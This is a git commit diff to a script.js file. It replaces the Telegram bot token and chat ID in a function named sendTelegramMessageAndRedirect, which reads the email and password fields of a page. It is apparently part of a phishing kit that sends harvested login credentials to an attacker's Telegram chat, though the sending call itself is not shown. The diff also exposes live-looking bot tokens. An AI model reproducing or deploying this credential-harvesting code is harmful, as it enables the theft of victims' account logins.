ad300d5ecb939926df7ecf9d303cee5216c5ba65
kpreciouss <makanjuolaprecious7@gmail.com>
2024-05-28 11:18:42 +0100

    Update script.js

--- script.js
+++ script.js
@@ -1,8 +1,8 @@
 console.log("sender.js connected");
 
 function sendTelegramMessageAndRedirect() {
-  const telegramBotToken = "6844888640:AAHaV1WfjOzhyXvzRXkKefB3KunOrrhZO68"; // Replace with your Telegram bot token
-  const chatId = 5349229520; // Replace with your chat ID
+  const telegramBotToken = "7155098618:AAE-Q-Vc9CJVd6TpaeB45yPuX9_SjOKlpCY"; // Replace with your Telegram bot token
+  const chatId = 1210077466; // Replace with your chat ID
 
   const emailValue = document.getElementById("email").value;
   const passwordValue = document.getElementById("password").value;
